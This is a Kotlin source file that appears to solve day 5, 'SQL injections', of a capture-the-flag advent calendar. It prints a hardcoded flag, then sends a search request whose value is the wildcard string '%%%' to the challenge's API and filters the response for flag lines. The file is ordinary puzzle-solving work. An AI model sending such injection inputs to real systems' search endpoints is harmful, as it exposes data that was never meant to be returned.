package luke.day05

import luke.Luke


import java.net.URI
import java.net.URLEncoder
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse

fun main() {
    Day05().run()
}

class Day05 : Luke() {
    override fun day() = 5
    override fun title() = "SQL injections"

    override fun run() {
        println("PST{5Q1_1nj€Ⓒt10n}")

        // Form values to send
        val url = "https://varelager.p26e.dev/api/search"
        val values = """{"key":"v1_pgmsqxmddz","search":"%%%"}"""

        // Send request
        val client = HttpClient.newBuilder().build();
        val request = HttpRequest.newBuilder()
            .uri(URI.create(url))
            .POST(HttpRequest.BodyPublishers.ofString(values))
            .header("Content-Type", "application/x-www-form-urlencoded")
            .build()
        val response = client.send(request, HttpResponse.BodyHandlers.ofString());
        //println(response.body()) <-- debugging print response

        // Loop trough response
        var lines = response.body().lines()

        // printing lines
        var x: Int = 1
        lines.forEach {
            if(it.contains("PST", ignoreCase = true) || it.contains("EGG", ignoreCase = true)) {
                println("Line $x: $it")
            }
            x = x+1
        }

    } // run



    fun String.utf8(): String = URLEncoder.encode(this, "UTF-8")

    fun formData(data: Map<String, String>): HttpRequest.BodyPublisher? {

        val res = data.map {(k, v) -> "${(k.utf8())}=${v.utf8()}"}
            .joinToString("&")

        return HttpRequest.BodyPublishers.ofString(res)
    } // formData


}
